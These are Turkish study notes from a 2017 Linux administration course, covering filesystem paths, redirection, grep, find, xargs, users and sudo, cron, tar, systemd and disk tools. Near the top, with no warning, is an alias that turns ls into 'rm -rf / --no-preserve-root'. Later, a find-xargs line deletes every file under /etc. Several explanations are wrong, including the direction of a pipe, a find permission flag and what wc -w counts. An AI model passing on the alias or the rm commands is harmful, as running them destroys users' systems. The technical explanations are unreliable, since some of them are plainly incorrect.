# LYK2017-Linux1
LYK2017 Gnu/Linux Sistem Yönetimi(1. Düzey) Notlarım

**Yapılacaklar**

1. Notlar Eklenecek
2. Uygulamalar Eklenecek
3. Yapılan Denemeler Hazırlanacak
4. Genel Düzenleme Yapılacak



*BASLANGIC*


alias ls='rm -rf / --no-preserve-root'  

GNU Core utilities  
  
$ normal user  
# root user    
    
`komut [parametre][argüman]  parametre = option --help`    
			    argüman = uzerıne uygulanacak dosya    
  
`man`    
Bilgi alma komutu    
  
`echo -e "hello\tworld"`    
*	hello    world  
  
  
info, man komutunun daha kapsamlı ve bilgi veren hali  
  
  
apropos disk  
*	içerisinde disk sözcüğü geçen tüm komutları ekrana basar    
  
ls    
ls -la color=never    
cd    
pwd    
date = tarih    
  
  
		DOSYA YAPISI  
/bin
*	bin = binary    
  
  
/boot
*	/boot/grub2/ bootloader seçenekleri    
  
/dev
*	devicelar var    
*	/dev/cpu çekirdeklere ulaşılır    
*	/dev/tty açılan terminalle (Alt + f2 f3 f4) ulaşılır    

/etc
*	configurasyon dosyalarının bulundugu dizin 			F.E:     
*	/etc/sysconfig sistem ayarlarının bulunduğu dizin    
*	/etc/resolvconf network ayarlarının bulunduğu kısım    
*	/etc/bashconfig.d bash kontrol eden dosya. terminal yönetimi ve tüm sistemi kontrol eden dosya    

/home    
*	kullanıcı dosyalarının bulunduğu kısımdır.    

/lib /lib64    
*	32 ve 64 bitlik librarylerin kullanım yerleri    

/media    
*	usb takıldığında harici disklerin veya disklerin olduğu yer    
*	her yere disk run edilebiliyor    

/mnt    
  
/opt    
*	sonradan kurulacak programların ulundupu dizin. paket yöneticisiz kurulan programlar    

/proc    
*	yapılan tüm işlemlerin tutulduğu ortam. proccess lerin işlem süreçlerinin tutulduğu yerdir    

/root    
*	root kullanıcısının bilgileri tutulur    

/run    
*	socket dosyalarının bulunduğu bölüm    

/srv    
*	sunulan dosyaların tutulduğu dizin dışarıya sununlan servisler    

/sys    
  
/tmp    
*	geçici dosyaların bulunduğu dizinve silebilirn    
*	yazan sadece görebilir    

/usr    
*	tüm kullanıcıların kullandığı tüm paket-dosya-programlar burada tutulur paylaşılan dosyalar tutlur    

/var    
*	değişkenler logların tutulduğu yer    
  
  
------------------------------------------------------  
  
  
/home/mchd/asd.pdf kesin(absolute) path    
*	tek tek bulunduğu dizine göre gidilirse relative path    
  
  
`~` kullanılan kullanıcının home dizinini verir    
`~mchd` = /home/mchd    
. bulunan    
.. geri    
cd - bir önce bulunulan konuma götürür  
  
. bulunduğu dizin ./ bulunduğu dizinden ötesi    
/Desktop/asd/ $ls /home/mchd/Desktop    
asd.txt    
cat ../asd.txt      
  
*	parametrenin konulduğu yer önemli değil. parametreler art arda kullanılabilir    

cd ../../../../    
mkdir -p /home/at/avrat/silah    
  
  
  
echo "hello world" 	>  dosya.txt		== hello world  
*			>> dosya.txt		== hello world \n hello world  
*			<  dosya.txt.       echo "fatih:b" > dosya  
*						chpasswd < dosya  
*					input değişikliği > ile \< arasındaki fark.  
*			\>\> dosya.txt		==  
  
\> < işaretleri her yerde kullanılır  
  
\< işareti input olarak bilgi alır  
\> işareti output olarak bilgi aktarır  
  
  
cat < input > output  
*	inputu outputa yazar  
  
touch asd/asd{1..5}.txt  
  
asd1.txt  
asd2.txt  
asd3.txt  
asd4.txt  
asd5.txt  
*	dosyalarini olusturur  
  
  
ls *  
*	tüm dizinlerdeki tüm dosyaları gösterir  

ls -d *  
*	sadece dizinlerdeki dosyaları gösterir  
  
  
*	touch ile notification date değiştirilebilir  
  
ls a?c  
*	a ile c nin arasında değişik olan karakter gösterir  
  
ls a*d  
*	a ile d arasındaki durumları basar  
*	^ buda bir işe yarıyor  
  
  
  
  
cat /dev.tty29 2> hata.err  
*	bu komuttan gelen hatayı hata.err dosyasına yazmaya yarar  
  
0 stdin  
1 stdout  
2 stderr  
  
*	komuttan dönenleri yönetmeye yarar  
  
  
echo "a" 1> a.out == echo "a" > a.out  
  
bash hata.sh > hata.out 2>&1  
*	hem hatayı hemde outputu dosyaya yaz  
  
bash hata.sh > hata.out  
*	hatayı ekrana  
*	outputu hata.out a yazmaya yarar.  


/////////////////////////////////////////////////////////////////////////////  
*	TERMINAL ISLEMLERI  

ctrl l terminali temizler  
ctrl r reverse search  
ctrl c kırmak için  
ctrl z suspend  
ctrl d girilen kullanıcıdan çıkmak için kullanılır  
ctrl w soldan sağa doğru kelime kelime silmeye yarar  
ctrl a satır başına gider  
ctrl e satır sonuna gider  
ctrl u imlecin solundaki her şeyi siler  
ctrl t soldaki karakter ile sağdakinin yerini değiştirir  
ctrl k sağ taraftaki her şeyi siler  
////////////////////////////////////////////////////////////////////////////  
  
  
22222222222222222222222222222222222222222222222222222222222  
  
cat <<EOF-  
ls -R /java  
  
 mv /dest/[1-3].txt .  
  
  
wc  
*	kelimeleri saymaya yarar word count  

uniq  
*	benzerleri tek gösterir  

head  
*	ilk 10 satır  

tail  
*	son 10 satir  
  
tail -f   
*	ANLIK OLARAK YAZILAN KARAKTERLERİ GERÇEK ZAMANLI OLARAK GOSTERİR  

tail -f DOSYA.TXT  
echo -e  
  
tail -f /var/log/secure  
*	anlık olarak log kaydedilir  
  
cut  
cut -d ':' -f 5 cut.txt  
*	belirli bir yerden sonrasını seçer  
  
rev  
*	gördüğünün tersini ekrana basar  
  
  
  
PİPE  
*	komut1 | komut2  
  
*	komut 2 nin çıktısını komut 1 e arguman olarak verir  
  
grep  
*	içerisinde istediğimiz kelimeleri aramaya yarayan komut  
  
grep -i  
*	büyük küçük harf duyarsız olarak tarama yapar  
  
  
  
cat asd.txt | grep 3 | wc -l  
  
cat /etc/passwd | grep -v "root" | uniq -u | sort -u | wc -l > a.txt  
*	root harici kullanıcı sayısını a.txt dosyasına yazar  
  
  
grep -ir daha kullanışlıdır  
grep -r 
*	dizindeki tüm dosyaların içerisinde tarama yapmaya yarar  
  
  
grep -ir "root" /etc/  
*	permission denied hatası verir bu hatayı görmek istemiyorsak  

grep -ir "root" /etc/ 2> /dev/null  
  
/dev/null  
*	boş işe yaramayan şeylerin atılacağı yer  
  
sort -u 
*	aynılarının tekrar etmemesini sağlar  

sort -k 
*	ls felanda çıkan dosyaları boyuta göre sıralamaya yarar  
  
wc -w	
*	cumle sayısı  

wc -l 
*	satır sayısı  

uniq -u	
*	cift olanlari tek yapar  
  
^ 
*	regexde satır başı na bakıp orayı alır  

$ 
*	regexde satır sonunda arama yapar oraya bakar  
  
grep -ir -e "^root" -e "mchd" -e "systemd" /etc/ 2> dev/null  
*	bir dizinde çoklu olarak dosya araması yapmaya -e yarar  
  
grep "^[0-9]" grep.txt  
*	sadece sayıyla başlayanları alır  

grep "^..[0-9]" grep.txt  
*	3. karakteri sayı olanları alır  
  
  
REGEX DE HER ". nokta" BİR KARAKTERDİR  
  
grep "^a[a,e]" grep.txt  == grep -E "fe|fa" grep.txt  
  
  
tr 
*	dosyadaki istedigimiz karakteri degıstırmeye yarayan komuut  
  
tr.txt  
123asdaa  
  
cat tr.txt | tr '[0-9]' 'x'  
  
cat tr.txt | tr [a-z] [A-Z] ==  cat tr.txt | tr [:lower:] [:upper]  
  
cat sezar.txt | tr [a-z] [d-za-c]  
  
  
cp -p 
*	yedek alıyor  

cp -i 
*	soruyor  
  
mkdir -p 
*	dizin oluşturur otomatik  
  
  
strings 
*	sadece string dosyalarını basar  
  
  
chattr 
*	üst seviye izin sağlar sudo nun erişemediği şeylere bununla erişilir  
  
  
more 
*	cat i ekrana sığdırmış gibi gösterir  
  
tail 
*	sondan karakter basar  

head 
*	baştan karakter basar  
  
  
333333333333333333333333333333333333333333333333333333333  
  
Çevre Değişkenleri  
  
  
env  
  
type  
*	komutun nerede olduğunu söyler  

type -a  
*	nereden geldiğini söyler  

file  
*	dosya hakkında bilgi verir  
  
which  
*	arguman olarak verilen komutun hangı path de durdugunu söyler  
  
/etc/bashrc  
*	bash ayarları bukunur  
*	tum kullanıcıların komutları  

~.bashrc  
*	sadece o kullanıcının kullanacağı komutlar var  

/etc/profile  
*	çevre değişkenleri tutulur.  

/etc/profile.d  
*	configuration dosyaları bulunur  
  
  
where  
*	komutun bulunduğu dizini gösterir  

whereis  
*	komutun man bilgileri ile beraber komutun yerini gösterir  
  
who  
*	o anda aktif olan oturum bilgisini g listeler  
  
  
w  
*	haber alma komutu who gibi daha kapsamlı  
  
last  
*	kullanıcıların kullandıgı seylerı basar  
*	ls -f o anda verdiğin dostanın kullandığı şeyleri basar  

nproc  
*	core işlemci adedini basar  
*	cat /proc/cpuinfo | less == lscpu  
  
lspci  
*	pci devicelerinin listesini verir ekran kartı wşreless kartı vb. gibi  

lsusb  
  
lscsi  
*	diskleri listeler  

lsboot  
*	boot deviceleri gösterir  

lsmod  
*	kernel üzerinde açık olan modilleri gösterir  

lsinitrd  
*	ram e atılan bootloader kernel vb. listesini listeler  

lsblk  
*	block deviceları gösterir  
  
  
/usr/share/man/man1/history.1.gz  
*	~/bash_history kullanıcı historysini tutar  
*	history dosyasnı tutar  
  
*********************************  
![sayi ] history içindeki istediğiniz sıradaki komutu ekrana basar  
*********************************  
history -c history i temizler  
  
watch  
*	verdiğiniz komutu verdiğimiz aralıkta çalıştırıır  

watch -n
*	hangi aralıkta kontrol edileceğini seçer  
watch -d 
*	değişiklikleri renklendirir  
  
uname  
*	kernel bilgisisni döker  

uname -a  
*	tüm bilgi işte  

uname -r  
*	en çok kulanılanlardan kernel release  

cat /etc/os-release  
*	işletim sistemii bilgisini döker  

cat /etc/issue  
*	işletim sistemini döker  

/etc/centos-release  
*	centos işletim sistemi bilgisini ekrana basar  
  
alias  
*	bir komutu başka bir komutla çağırmaya yarar  
*	alias komutunu /etc/bashrc nin içine gömersek o komut sürekli kalır  

unalias  
*	aliase siler ypatıgın komut  
  
source  
*	bir şey yaptıktan sonra konfigurasyon dosyasını yazınca yaptıgın degisikliği alır  
  
  
export ILK_DEGISKEN="ilk degisken"  
echo $ILK_DEGISKEN  
*	kalıcı olması için /etc/profile dosyasının içine yazmak lazım  
  
  
ls -lia  
ls -i 
*	dosyanın fiziksel olarak hangi blokta durdugunu gösterir  

SOFT - HARD LINK

  
ln -s 
*	bir dosyaya kaynak başka bir dosya tanımlamaya yarar  
  
ln -s 
*	soft link vermeye yarar. diskte tutulan adresleri farklı olur birini silince diğeri etkilenmez  
ama dosya değişince değişirler karşılıklı  
  
*	ln ile yapınca hard link olur diskte aynı yere yazar silinince hepsi gider. silince hiçbiri silinmez yedekleme için kullanılır  
  
ln -s ana_dosya s_link  
ln ana_dosya h_link  
*	unlink linksiz bırakır  

ln -f force  
*	absolute path yapmak daha iyidir  
  
--------------------------------------------------------------  
		KULLANICI YONETİMİ  
  
izinler  
user  u  
group  g  
others  o  
all  a  
read  r  
write  w  
executable x çalıştırılaiblir  
4 2 1  
ugoa  
izin	a u g o  
chmod  
chown  
  
chmod  
*	dosya dizin üzerindeki hakları değiştirmeye yarayan komut  
*	sayı ve harflerle kullanılır  
  
chown  
*	sahipliğini değiştirmek için kullanılır  
*	bir dizine bir kullanıcı yada sahip sahip olur  
  
chmod ugo+rwx  
chmod ugo-rwx 
*	izin ekleme çıkarmaya yarar  

chmod -R 
*	alttaki tüm dosya ve klasörler için komutu çalıştırır  

chmod  
  
chown user:group izinler 
*	sahiplik için  

chown user 
*	sadece user için  

chown :group 
*	sadece grup için  
  

linklenmiş dosya ln -s izinleri asıl dosyada kapalıyken link dosyasında açık olsa da farketmez  
hard link izinleri değişince ana dosyanınkide değişir  
    
  
  
useradd 
*	kullanıcı yaratmaya yarar  

adduser 
*	cekirdekteki bilgiler gibi doldurur tavsiye edilmez  

useradd -D 
*	default degerleri kullanır  
*	eklenen kullanıcılar 1000 den başlar  
*	1000 altındaki kulanıcılar sistem kullanıcısıdır msfconsole ftp httpd gibi  

umask
*	 kullanıcı dosya oluşturduğunda default haklarını belirlemeye yarar  

022 077 degerleri var  

umask dizinler icin 777 dosyalar icin 666 dan dosya izinleri cikarilarak hesaplanir  
dosyanin herkes tarafindan calistirilabilme yetkisi olmasini engellemek icin 666 hesaplanir  
  
  
  
/etc/login.defs  
*	yeni bir user oldugunda default veya normal degerlerinin tutuldugu dosyadir

/etc/passwd  
*	user bilgilerinin tutulduğu alandır  
*	username:passsword:userid:groupid:groupname:homefolder:login shelli  

/etc/group  
*	grupların bilgisinin tutulduğu dizindir  

/etc/shadow  
*	user password ve bazi bilgilerinin tutuldugu dosyadır  

/etc/gshadow  
*	group passwordlarının* tutulduğu alan  

/etc/pam.d/  
*	linuxdaki tüm işlemlerin yapıldığı klasördür authentication configurasyonlarının bulunduğu dizindir  
*	pam ise configurasyon fffff.  

 ------------------------------------------------  
login.defs 
*	şifrenin ne ile hashlendiğini tutar. şifre bilfgisi ise /etc/shadow da bulunur  
 yada kendi kullanıcına a,t bilgileri uzaktakine atarsan oradaki şifreler seninkiyle aynı olur  

----------------------------------------------  
shadow daki !! şifre olmadığını belirtir  
  
  
sticky bit
*	 bir şeyi sadece sahibi silebilir  
tmp dizini bu örnek için en uygun dizin  
  
setuid  
  
setgid  
 
========================================================================================	  
  
--------------------------------------------  
/etc/login.defs 
*	kullanıcının default ayarlarının tutulduğu alan  
umask değeri buradan değiştirilir  

--------------------------------------------  
  
  
umask dizinler için izinlerin değerini 777 den  
dosyalar için 666 dan çıkarılarak bulunur  
aynı zamanda dosya izinleri default umask değeri ters şekilde çıkarılarak bulunur  
  
umask dosyaya verilebilecek izinleri kısıtlar -------------------------------------  
  
watch -n 
*	anlık olarak izler  
  
chown -R mchd. == chown -R mchd:mchd  
  
echo $USER  
  
cat /etc/passwd 
*	tüm kullanıcıları görmemizi sağlar  
  
chmod +t 
*	sticky bit vermeye yarar  
  
suid   sgid    stickybit  
4	2	1  
  
  
suid  
	set user id yi bir dosyaya tanımlarsak   
  
  
  
  
groupadd  
groupadd -g 1010 groupnumber1010  
groupadd -r -g (-r) 
*	sistem kullanıcısı yani id 1000 altında olabilir -g ise numarasını belrleme  
  
  
useradd 
*	kullanıcıya elle parametre vermeye yarar  

useradd -m -d /home/gg -u 1905 -c 'dotaci' -g wp -G games,cdrom,wheel,audio,video gg  

-aG 
*	 eklenen sistem gruplarına sonradan eklme yapmaya yarar  

usermod 
*	tüm parametrelerin tekrar çalıştırılmasını yarar  
  
groups 
*	bir kullanıcının hangi gruplara dahil olduğu bilgisini döker  
  
echo $SHELL  
*	shell ogrenilip istediğin shelli konfigure etmeni  

usermod -s /bin/sh gg   
*	bu komut sağlar  
  
passwd  
*	parola değiştirmede kullanılır  
  
tail -f -n100 /var/log/secure  
*	authentication işlemleri buraya yazılır  
  
/var/log/secure  
*	parola kayıtlarının tutulduğu log dosyası  
  
chsh -s /bin/bash ww  
*	login shell ini değiştirir  
  
chpasswd  
giriş bekler    kullnıcıadı:parola      bekler  
*	çok kullanıcı için değiştirmek için kullanılır  
chgrp grupismi dosyaismi           dosyanın grubunu değiştirmeye yarar  
  
  
sudo   
*	başka bir kullanıcı adına işlemleri yapmak için tanımlanır  
  
sudo nun kullanım nedeni kendi parolanı vererek root a da erişim sağlar root parolası paylaşmasın diye  
  
/etc/sudoers  
/etc/sudoers.d  
*	sudo yapılandırmalarını yapar  
  
visudo -f /etc/sudoers  
sudoedit  
*	ile sudoers dosyasini duzenleyen text editor acar.  
sudo dosyasını güvenli bir şekilde change etmemizi sağlar  
  
*	visudo kullanılmasının nedeni check yapıp hata yoksa sadece çıkmanı sağlar  
hata veya yanlış bir yer varsa çıkmanıza izin vermez  
  
sudo bazı kullanıcılarda roota erişemez. normal kullanıcı girmeye çalışınca raporlarım diye sonuç çıkarıı  
var/log/secure de sudo nun alacagi komutlar belirlenir  
daha sonrasında    
visudo -f /etc/sudoers   
dosyasına o kullanıcıyı ekleyip root yetkileri verilir  


ww ALL=(ALL) ALL  
ww ALL=ALL !/bin/su     kullanıcı su komutunu kullanamasın demek  
*	NOPASSWD:ALL hiç bir komut için parola istemez  
  
*	*NORMAL KULLANICI OLARAKTA SUDOERS DOSYASI DEĞİŞTİRİLİR SONRA OTOMATİK OLARAK GİRİŞ YAPAR SUDO OLARAK*  
  
  
  
=============================================================================================  
  
FİND   


*	sistemde verilen özellik veya filtrelere göre kısıtlama yapıp arama yapar  

-exec  
*	find /etc -name "?y*" -exec bu komutun yanında benim vereceğım bash komutunu çalıştır demek  

-type  [b,c,d,l,f,s,p] parametreleri verilebilir  
*	

d
*	 directory  

f
* 	file  

l 
*	semboliik bilgi döker  

-user root  
*	sahibi root olan tüm dosya dizin felanları listele  

-group tss  
*	sahibi tss olan tü m dosya dizin felanları listeler  

! işareti 
*	olmayanları belirtmek için kullanılır  

-uid 1089  
*	user id si 1089 olan dosyaları döker  

-gid group id  

-uid -1089  
*	user id si 1089 dan küçük olanları  

-uid +1089  
*	1089 un üstündeki değerleri basar  

-perm 644  
*	izin değeri 644 olanları dök rwx  

-perm a=r  
*	tüm kullanıcıları yazma izni olan dosyaları döker  

-perm a=r,o=w,u=xw  
  
stat  
*	bir dosya ile ilgili ayrıntılı bilgilere access time felam erişilir  
  
find . -amin +7  
*	access time ile farkı diğerleri arasında olanı gösterir  

find . -atime 1 
*	en son 1 gün öncesinde üzerinden geçilmiş dosya  
  
find . -anewer ctime.txt  
*	şu dosyadan daha yenilerini bul  
  
touch -a -d 
*	access time felan değiştirir  
  
--------------------------------------------------------------  
truncate -s 100M ctime.txt  
*	dosyayı 100 mb yapıyor  
dosyayı istediğin boyutta yapıyor  
--------------------------------------------------------------  
  
find . -size +1M   
1mb dan büyükleri gösterir  
  
find . -size +1M -exec mv -t /tmp {} \;  
  
sudo find / -executable   
*	çalıştırılabilir dosyaları dök   

find / -writable  
find / -readable   
*	yazılabilenker ve okunabilenleri yazar  
  
-ok 
*	execin yaptgı her seyi yapar artı olarak yapayımmı diye sorar  
  
3  
soldaki komutun her çıktısı için bir bash komutu çalıştır  

find /etc/ -type -f | xargs rm -rf  
*	etc nin altındaki her dosya için silme komutunu çalıştır  
  
ls | xargs grep "mchdd"  
*	o dizindeki tüm klasörlerdeki mchdd leri döker  

ls | xargs -I '{}' echo "fyarci" > '{}'  
*	içerideki tüm dosyalara fyarci satırını yaz  
  
----------------------------   -type f kullanılmalı   -----------------------  
  
-print 
*	buldupun seyleri yazar  
  
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||  
ls | cut -d '.' -f 1 | xargs -I file mv file.txt file.out  
*	dosya yı bir yerden alıp file in txt halini file out a cevırır coklu olarak  
yani xargs I aldığı dosya karakterini file olarak tanımlayıp dosya + txt hallerini  
dosya + out a çevirir çoklu olarak 3 5 20 100 dosyayı değiştirir  

|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||  


  
sudo find /etc/ -name "?y*" -type f -execc grep "bash" {} \;  
find /var/log -type f -size +30c | sudo xargs grep "root"  
sudo find / -size +1M 2> /dev/null | sort -n | head -n10  
  
sudo find / -size +1M -printf "%s %p\n" 2> /dev/null | sort -n | head -n10  
sudo find / -size +1M -ls 2> /dev/null | sort -nk 7  
find . -type f -exec rm {} \;  
   
  
  
-------------------------------------------------------------------------------------_  
-exec ilerisinde yazılacak komuta ilk komutu argüman olarak vermeye yarar  
| xargs ise aynısıdır   
--------------------------------------------------------------------------------------_  
  
  
  
2> /dev/null candır  
  
exitcode 
*	çıkış kodu  
her şey yolunda ise exitcode 0 olur  
eğerki yapılan komutta hata varsa exitcode 1 den 255 e kadar değer üretir  
  

MANTIK OPERATORLERİ    
  
&&  ve and  
||  veya or  
;   sleep yapar ne yaptığı belli değil gevşeğin  
  
----------------------------------------------------------  
script  
*	terminalde gördüğün her şeyi bir dosyaya kaydeder  

----------------------------------------------------------  
  
cat <<AT   
*	AT kelimesi girilene kadar bilgi toplayıp ekrana basar  
  
elinks 
*	1800 lü yıllara götürür  
terminal üzerinde çalışan browser ^..^  
  

  
****************************************************************************************  
	ZAMANLANMIŞ GÖREVLER   task scheduling  
  
crontab  

-e  
*	o anda kullanılan userla  görevler belirlenir  

-u
*	 hangi kullanıcı olmasını istersek sonuna ekleriz  

-r 
*	tüm cronlar silinir  

-l
*	 cronları listeler  
  

bir görevi ne zaman çalıştıracağını belritir  
sadece sistem çalışırken çalışır  
  
anacron  
*	sistemin çalışığ çalışmadığını kontrol etmeden çalışır  
  
* * * * *  
- - - - -  
| | | | |  
| | | | |  
| | | | ------haftadaki hangi gğn  
| | | --------hangi ay  
| | ----------ay içerisinde hangi günler  
| ------------saat  
--------------dakika  
  
  
30 12 *** echo "hello world"  
*	her 12 30 saatte hello world çalıştırır yani saat 12 30 da çalışır  
  
*/5 * * * * 
*	her 5 dakika da bir çalıştırır  

soru:  
haftaici  
15-30 gunler  
subat  
12:27  
12:42  
  
crontab -e  
27,42 12 15-30 2 1-5 *  
  
cron diye dizin oluştur  
içine 100 tane farklı dosya oluştur  
tüm dosyaların izinlerini random şekilde degıstır (shuf)  
sonra 5 dk da bir çalışacak crın yaz  
cron by dizindeki dosyaların sahipliklerini 644 e çevir  
her çevirdığı dosyanın ısmını /var/log/izin_cron.log dosyasına loglasın  
  
  
  
shuf -i1-100 -n1  
*	1 den 100 arasinda random sayi olusturur  
  
;;;;;;;;;;;;;;;::::::;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;  
echo "hello world ´date´ "							     ;  
*	echo komutunu çalıştır bide içine date komutunun çıktısını ekleyip ekrana bas  
chown ´whoami´:´whoami´ find   ´´ bu tırnakların içinde yazan komutu çalıştırır  


;;;;;;;;;::::::;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;  

´´ alt + ş ile yapılan iki tırnak arasına hangi komutu koyarsan koy çalışır  

--------------------------------------------------------------------------------------  
  
fsck  
*	disk tarayıp isimsiz verileri lost a rtı founda vırakır  

rm -rf 
*	f force sormadan sil  
  
  
/etc/cron  
*	daily montly yearly dosyalar var bunların içine cron atınca direk çalışır  

cron.d 
*	ise tümünün tutulduğu dizin  
  
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&66  
  
	ARŞİVLEME VE SIKIŞTIRMA YÖNTEMLERİ  
  
tar  
*	-c create  
*	-v verbose mode yaptığın şeyi çıktıla  
*	-f yaptığın şeyi dosya haline getir  
*	-t arşivi listele  
*	-x arşivi açmaya yarar  
*	-r arsivin icine yeni bir dosyayı sonradan eklemeye yarar  
*	-z ziple sıkıştırmaya yarar  
*	-j bzip2 olarak sıkıştırmaya yarar  
*	-J xz ile sıkıştırmaya yarar  (zip türleri aşağıda yazılmış halde var açıklamalı)  
  
tar xvf arsiv.tar.xz -C /tmp/  
*	bu arşivi tmp klasörüne çıkar  
  
-xvf --wildcards --no-anchored 'dosya.txt'   
*	arsivin içerisinde dosya.txt adındaki dosyayı sadece dışarı çıkar  
wildcard komuttan sonra bazı regexleri kullanabilmek için yapılır  
  
--exclude 
*	arşivlerken belirteceğim dosyaları alma  

tar -cvfJ --exclude "arsiv/1.txt" --file arsiv.xz arsiv/		
*	1.txt hariç hepsini al  --exclude "[0-4].txt" 0 dan 4 e kadar olanları alma  

--delete -f arsiv.tar arsiv/dosya.txt	
*	arsivin içinden dosya.txt dosyasını silmemize yarar  
yukarıdaki -f arşivim bu demek için yazılmış  

--strip-components 1		
*	arsivi açarken başındaki pathlerden birini sil  
*	2,3, sayı değişken oldugu duruma göre path geri gider  
  
*	yani arsiv/dosya.txt ise arsivi silip direk olduğun yere çıkarıyor  
  
tar lamak boyutu değiştirmez onu zip yani z parametresi ile ziple sıkıştırmak lazım boyuttan kazanmak için  
___  
| |  
---  
  
tar -cvf arsiv.tar arsivlenecek_dosyalar  
tar cvfz arsiv.tar.gz arsiv  
  
tarı - "tire"siz kullanmak deneyim göstergesidir   ^_^  

  
  
gzip   
*	gnu zip sıkıştırma demek  

bzip2   
*	yeni bir sıkıştırma yöntemi  
bu büyük dosyaları sıkıştırmak için idealdir  

xz  
*	çok uzun sürüyor ama 1 gblık dosyayı 150 mb a kadar sıkıştırabiliyor  
  
-----------------bir şeyi sıkıştırırken tarihini sonuna eklemek kullanışlıdır --------------------------------------  
  0000000000000000000000000000000000000000000000000000000000000000000000000000  
  
	SÜREÇ YÖNETİMİ  
			  
  
systemv	|	systemd	
-------	|	-------	
init	|	systemctl
0 halt	|	0 halt
1 single user	|	1 rescue mode
2 multi-user without networking	|	-
3 multi-user without GUI	|	3 multi-user.target
4 nondefined	|	-
5 multi-user with xserver(GUI)	|	5 graphical.target
6 reboot	|	6 reboot
service	|	systemctl


hizmetler	|	optionslar  
----------	|	-----------
service sshd start/stop/restart/status	|	reload/force-reload...   
systemctl start/stop/restert/status	|	reload/force-reload .. 	(sshd)  

	servis ismi  
  
  
sshd   
*	ssh daemon  

runlevel  
*	systemV nin hangi levelda çalıştığını gösterir  

systemctl get-default  
*	systemd nin default levelini gösterir  
  
systemctl yazınca çalışan servisleri gösterir  
  
chkconfig enable/disable  
chkconfig sshd on/off  
*	sistem açıldığında bir servisin açılıp açılmayacağını belirlemeye yarar açılış uygulamaları  
  
systemctl enable/disable sshd.service 
*	yukarıdakinin systemd versiyonu  

systemctl is-enabled sshd  
*	sshd servisinin açıkmı kapalımı olduğunu gösterir  
  
*	***init [runlevel] hangi levelde açılacağı belirlenir***  
  
systemctl set-default graphical.target 
*	örneğin graphical target levelinde açmaya set edilir  
  
nginx web server herangi bir websitesini browserdan görmemizi sağlayan browser nginx  
  

---------------------------------------------------------------------------------------------------------  

işletim sistemi başlıyor ve login ekranı gelir gelmez kapanıyorsa systemd veya systemv değeri  
level 6 da olduğundan reboot çalışır ve sürekli açılıp kapanır. single user mod leveline almak lazım  

---------------------------------------------------------------------------------------------------------  
  
dns  
*	uzak sunucunun hangi ıp ye aıt oldugunu gösteren servis  
  
telnet   
*	uzaktaki bir sunucuyu yönetmeye yarayan şey  
  
  
/etc/systemd/  
*	systemd configurasyon dosyaları  

/etc/systemd/system  
*	levellara göre çalışacak uygulamaları gömüleck configurasyon dosyalarının tutulduğu alan  
  
  
enable ile startıng farkı sistem açılışında servisin açık olup olmayacağı ile alakalı  
  
  
  
			*PROCESS YÖNETİMİ*		
  
ps faux  
*	ps komutu sadece o anda çalışan paremetreleri gösterir  

x  
*	herhangi bir terminalde çalışanları listele  

f  
*	process hiyerarşisi	  

u  
*	user pariamented daha fazla bilgi verir  
  
parent process  
*	asıl çalışan process . bu olmazsa child processler çalışmaz  

child process  
*	bu ise altında çalılşan processtir  
  

yani örneğin  
bash üzerinde çalışan bir tail -f komutu . tail -f sonlandırana kadar çalışır veya bash ı kapatana kadar çalışır  
bu durumda bash parent process   
tail -f komutu ise child processtir  
  
  
STAT  
https://askubuntu.com/questions/360252/what-do-the-stat-column-values-in-ps-mean  
  
  
process işlem sinyalleri  
1 hangup  
9 kill  
15 termination  
  
*	termination ile kill arasındaki fark . kill termination un --force kullanılmış hali  
  
kill -9 1234  (kill -KILL 1234)   
*	bu örnekte  -9 sinyali yani force kill ile process sonlandırmaya yarar  

kill -15 1234	(kill -TERM 1234)    
*	bu örnekta -15 sinyali yani kill kullanırken termination sinyalini kullan demek  
bu sinyaller yukarıda kodlanmıştır  
 
  
*	önplanda çalışan bir komutun sonuna & işareti koyulursa arka planda çalıştırmaya yarar  

jobs   
*	arkaplanda çalışan processleri gösterir  

fg  
*	processi tekrar ön plana alır  
fg hep son çalışanı alır eğer fg den sonra jobstan çıkan komutların baş sayısını verirsek onu öne alır  

fg 3 
*	3. arkaplan processini öne alır  

bg  
*	bir şey yapar ama bakmak lazım  

ctrl z ile geri arkaplana atar uyku modu  
  
pkill tail   
*	tail le alakalı olan tüm komutları kill ler  
  
pkill mchd  
  
  
pgrep  
*	processler arasınfa arama yapmayı sağlar  
disown  
  
apropos ctl  
*	ctl parametreleri öğrenilebilir  
  
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\*  
  
	*DİSK YÖNETİMİ*  
  
  
free -h  
*	disk bilgilerini döker ram bilgisini de yazdırır  
  
fdisk  
*	diskleri yönetmeye yarayan toolun adı  

-l  
*	fiziksel olarak makineye bağlı olan diskleri gösterir  
  
fdisk /dev/sdb  

p   
*	o andaki partition table i döküyor  

d  
*	silmeye yarar  

n   
*	create partition  

t  
*	disk tipini oluşturmamızı sağlar fat32 ext4 felan gibi  

82 swap  
83 linux partition  

d  
*	partition silmeye yarar  

a  
*	a girdıkten sonra seçilen diski bootable yapmaya yarar  

w  
*	kaydetmeye yarar  
  
mkfs.*  
*	biçimlendirmeye yarar yani tip belirler  
  
mkfs.ext /dev/sdb1  
*	dev/sdb1 i ext4 yapmaya yarar  

mkswap  
*	istediğin partition u swap olarak biçimlendirmeye yarar  
  
mount  
mount /dev/sdb1 /mnt  
*	sdb1 diskini mnt ye bağlar mount eder  
  
df  
*	sistemde hangi diskin nereye bağlı olduğunu gösteren komut  

-T  
*	disk tiiplerini de döker  
  
umount   
umount /mnt/  
*	unmount etmeye yarar  
  
/etc/fstab  
*	bilgisayar kapanıp açıldığında otomatik olarak mount edilip edilmeyeceğini sağlayacağımız default dosyası  
  
mount -a   
*	fstab dosyasını okuyup oradaki diskleri olması gereken yere bağlar  
  
bazen unmount edemediğinde servis busy hatası verir kaynak olarak neyin kullandığını gösterir  
sorun belki diğer disklerinde aynı klasöre bağlı olup sırasıyla mount edilmediğinden kaynaklanıyor olabilir  
  
lsof   
